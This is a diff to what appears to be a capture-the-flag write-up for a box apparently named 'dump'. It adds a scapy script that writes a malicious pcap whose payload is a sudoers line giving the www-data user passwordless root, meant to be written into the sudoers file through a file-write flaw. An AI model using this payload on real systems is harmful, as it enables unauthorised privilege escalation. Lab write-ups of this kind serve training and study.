@@ -297,6 +297,21 @@ www-data@dump:/var/cache/captures$
 
 As seen here it has wrote the file
 
+Now i need to actually abuse this using a malcious pcap file, ill do this with scapy
+
+```python
+from scapy.all import Raw, wrpcap
+
+# payload: leading newline is deliberate, in case it lands mid-garbage
+# so the previous (garbage) "line" is cleanly terminated before yours starts
+payload = b"\n" + b"www-data ALL=(ALL) NOPASSWD: ALL\n" + b"\n"
+
+pkt = Raw(load=payload)
+wrpcap("evil.pcap", [pkt])
+```
+
+This is the script ill use to generate me a pcap with syntax to write to the sudoers file
+
 ```python
 ❯❯❯ python3 -m venv venv && source venv/bin/activate
  
